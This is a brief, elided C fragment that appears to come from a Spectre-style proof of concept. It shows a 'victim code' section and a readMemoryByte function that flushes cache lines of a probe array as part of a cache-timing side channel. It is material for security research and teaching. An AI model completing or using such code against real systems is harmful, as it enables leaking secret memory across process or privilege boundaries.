...
const int TARGET_SIZE = (1 << TARGET_OFFSET);
/********************************************************************
Victim code.
********************************************************************/
...
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
    ...
    for (tries = 999; tries > 0; tries--) {
        ...
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * TARGET_SIZE]); /* clflush */
